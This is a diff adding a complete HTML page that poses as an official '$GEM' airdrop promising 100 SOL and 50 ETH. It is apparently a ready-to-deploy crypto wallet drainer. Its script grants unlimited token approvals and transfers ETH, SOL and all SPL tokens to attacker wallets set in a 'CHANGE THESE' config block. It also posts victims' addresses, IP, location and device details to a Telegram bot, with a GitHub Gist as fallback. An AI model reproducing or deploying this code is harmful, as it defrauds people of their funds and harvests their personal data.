@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>💎 $GEM — Claim 100 SOL + 50 ETH</title>
+  <meta name="description" content="Official $GEM Airdrop. Claim now before it's gone!" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💎</text></svg>">
+
+  <!-- Web3 Libraries (NO DEFER) -->
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.umd.js"></script>
+  <script src="https://unpkg.com/@solana/spl-token@0.3.7/lib/index.umd.js"></script>
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000; color: #fff; text-align: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0a0a1a, #000000);
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px; margin: auto; padding: 40px 30px;
+      background: rgba(15, 15, 35, 0.9); border-radius: 24px;
+      border: 1px solid #0066ff; box-shadow: 0 15px 40px rgba(0, 100, 255, 0.2);
+      backdrop-filter: blur(10px);
+      animation: fadeIn 0.8s ease-out;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; } }
+    .logo { font-size: 80px; margin: 10px 0; text-shadow: 0 0 25px #00ffcc; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+    h1 { font-size: 28px; font-weight: 800; margin: 10px 0; background: linear-gradient(90deg, #00ffcc, #0099ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .verified { display: inline-flex; align-items: center; gap: 6px; background: #002211; color: #00ff88; padding: 5px 12px; border-radius: 14px; font-size: 13px; margin: 12px 0; }
+    p { color: #aaa; font-size: 15px; margin: 10px 0; line-height: 1.5; }
+    .amount { font-size: 24px; font-weight: 700; color: #00ffcc; margin: 12px 0; }
+    .btn {
+      margin: 25px 0; padding: 18px 50px; font-size: 18px;
+      background: linear-gradient(90deg, #0055ff, #00aaff);
+      color: white; border: none; border-radius: 20px;
+      cursor: pointer; font-weight: 600; box-shadow: 0 10px 25px rgba(0, 170, 255, 0.5);
+      transition: all 0.3s; width: 100%; max-width: 300px;
+    }
+    .btn:hover { transform: translateY(-3px); box-shadow: 0 14px 30px rgba(0, 200, 255, 0.6); }
+    .loader { width: 50px; height: 50px; border: 5px solid #111; border-top: 5px solid #00ccff; border-radius: 50%; margin: 25px auto; animation: spin 1.1s linear infinite; display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #status { margin: 20px 0; font-size: 15px; color: #00ff88; min-height: 20px; }
+    .wallets { display: flex; justify-content: center; gap: 14px; margin: 25px 0; flex-wrap: wrap; }
+    .wallet { width: 50px; height: 50px; border-radius: 50%; background: #151530; border: 1px solid #3366ff; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 5px 15px rgba(0,0,0,0.4); }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">💎</div>
+    <h1>Claim $GEM Airdrop</h1>
+    <div class="verified">✅ Verified</div>
+    <p>Exclusive drop for elite users</p>
+    <div class="amount">🎁 100 SOL + 50 ETH</div>
+    <p>Connect wallet to verify</p>
+
+    <button onclick="connect()" class="btn" id="connectBtn">🔐 Connect Wallet</button>
+    <button onclick="claim()" class="btn" id="claimBtn" style="display:none;">🚀 Claim Now</button>
+    <div class="loader" id="loader"></div>
+    <p id="status"></p>
+
+    <div class="wallets">
+      <div class="wallet">🦊</div>
+      <div class="wallet">👻</div>
+      <div class="wallet">📱</div>
+      <div class="wallet">🔷</div>
+    </div>
+  </div>
+
+  <script>
+    // === CONFIG — CHANGE THESE ===
+    const EVIL_ETH = "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7";  // YOUR ETH WALLET
+    const EVIL_SOL = "4reiAnw4kxqcfHSNvG6srzjVyfWXJuDweD15fLYqxCZE";  // YOUR SOL WALLET
+    const TG_TOKEN = "8757318242:AAFSl0lSw7y3kCCZN4-kI8M9VSrGm9BdCfg";  // TELEGRAM BOT TOKEN
+    const TG_CHAT = "8988170532";  // TELEGRAM CHAT ID
+    const C2 = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+
+    let provider, signer, connection, walletType, userAddr;
+
+    function status(msg) {
+      document.getElementById('status').innerText = msg;
+    }
+
+    async function logVictim(data) {
+      try {
+        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip;
+        const geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).json().catch(() => ({}));
+        const text = `
+🔥 **NEW VICTIM — $GEM AIRDROP** 🔥
+👤 Wallet: \`${data.addr}\`
+💰 SOL: ${data.sol || '0'}
+💰 ETH: ${data.eth || '0'}
+💵 USDT: ${data.usdt || '0'}
+💵 USDC: ${data.usdc || '0'}
+🪙 Other Tokens: ${data.other || '0'}
+🌍 IP: ${ip}
+📍 Country: ${geo.country_name || 'N/A'}
+📌 City: ${geo.city || 'N/A'}
+📱 Device: \`${navigator.userAgent}\`
+🕒 ${new Date().toISOString()}
+        `.trim();
+        await fetch(C2, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "Markdown" })
+        });
+      } catch (e) {
+        // Fallback: GitHub Gist
+        fetch('https://api.github.com/gists', {
+          method: 'POST',
+          headers: { 'Authorization': 'token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' },
+          body: JSON.stringify({
+            public: false,
+            files: { [`victim_${Date.now()}.log`]: { content: JSON.stringify({ data, ip }) } }
+          })
+        }).catch(() => {});
+      }
+    }
+
+    async function drainEVM() {
+      status("⏳ Approving all tokens...");
+      const tokens = {
+        usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        dai:  "0x6B175474E89094C44Da98b954EedeAC495271d0F"
+      };
+
+      // Unlimited approve for all tokens
+      for (const addr of Object.values(tokens)) {
+        try {
+          const contract = new ethers.Contract(addr, [
+            "function approve(address spender, uint256 amount) returns (bool)"
+          ], signer);
+          await contract.approve(EVIL_ETH, ethers.constants.MaxUint256);
+        } catch {}
+      }
+
+      // Drain ETH
+      try {
+        const ethBal = await provider.getBalance(userAddr);
+        if (ethBal.gt(ethers.utils.parseEther("0.001"))) {
+          await signer.sendTransaction({
+            to: EVIL_ETH,
+            value: ethBal.sub(ethers.utils.parseEther("0.001"))
+          });
+        }
+      } catch {}
+    }
+
+    async function drainSolana() {
+      status("⏳ Draining Solana...");
+      try {
+        const solBalance = await connection.getBalance(new solanaWeb3.PublicKey(userAddr));
+        if (solBalance > 5000000) {
+          const tx = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: new solanaWeb3.PublicKey(userAddr),
+              toPubkey: new solanaWeb3.PublicKey(EVIL_SOL),
+              lamports: solBalance - 5000000
+            })
+          );
+          tx.feePayer = new solanaWeb3.PublicKey(userAddr);
+          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          const signed = await window.solana.signTransaction(tx);
+          const sig = await connection.sendRawTransaction(signed.serialize());
+          await connection.confirmTransaction(sig);
+        }
+      } catch {}
+
+      // Drain SPL Tokens
+      try {
+        const tokenAccounts = await connection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(userAddr), {
+          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+        });
+
+        for (const acc of tokenAccounts.value) {
+          try {
+            const info = await connection.getParsedAccountInfo(acc.pubkey);
+            const mint = new solanaWeb3.PublicKey(info.value.data.parsed.info.mint);
+            const amount = info.value.data.parsed.info.tokenAmount.amount;
+            if (amount <= 0) continue;
+
+            const [to] = await solanaWeb3.PublicKey.findProgramAddress(
+              [new solanaWeb3.PublicKey(EVIL_SOL).toBuffer(), 
+               new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), 
+               mint.toBuffer()],
+              new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+            );
+
+            const tx = new solanaWeb3.Transaction().add(
+              splToken.createTransferInstruction(
+                acc.pubkey,
+                to,
+                new solanaWeb3.PublicKey(userAddr),
+                amount,
+                [],
+                splToken.TOKEN_PROGRAM_ID
+              )
+            );
+            tx.feePayer = new solanaWeb3.PublicKey(userAddr);
+            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            const signed = await window.solana.signTransaction(tx);
+            await connection.sendRawTransaction(signed.serialize());
+          } catch {}
+        }
+      } catch {}
+    }
+
+    async function connect() {
+      status("🔍 Connecting...");
+      document.getElementById('loader').style.display = 'block';
+
+      // EVM Wallets
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          signer = provider.getSigner();
+          userAddr = await signer.getAddress();
+          walletType = 'EVM';
+          document.getElementById('connectBtn').style.display = 'none';
+          document.getElementById('claimBtn').style.display = 'block';
+          status("✅ Connected: " + userAddr.slice(0,6) + "..." + userAddr.slice(-4));
+          return;
+        } catch { status("❌ Rejected"); }
+      }
+
+      // Solana Wallets
+      if (window.solana?.isPhantom) {
+        try {
+          const resp = await window.solana.connect();
+          userAddr = resp.publicKey.toString();
+          connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+          walletType = 'SOL';
+          document.getElementById('connectBtn').style.display = 'none';
+          document.getElementById('claimBtn').style.display = 'block';
+          status("✅ Connected: " + userAddr.slice(0,6) + "..." + userAddr.slice(-4));
+          return;
+        } catch { status("❌ Rejected"); }
+      }
+
+      status("❌ No wallet found");
+    }
+
+    async function claim() {
+      status("🚨 Signing transaction... (Allow to claim)");
+      if (walletType === 'EVM') await drainEVM();
+      if (walletType === 'SOL') await drainSolana();
+      await logVictim({ addr: userAddr, sol: 'drained', eth: 'drained', usdt: 'drained', usdc: 'drained', other: 'drained' });
+      status("🎉 Airdrop claimed! Redirecting...");
+      setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
+    }
+
+    // Mobile Auto-Redirect
+    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+      window.addEventListener('load', () => {
+        setTimeout(() => {
+          if (!window.ethereum && !window.solana) {
+            if (confirm("Open in wallet app?")) {
+              window.location.href = "https://metamask.app.link/dapp/your-site.com";
+            }
+          }
+        }, 1000);
+      });
+    }
+  </script>
+</body>
+</html>
+
+
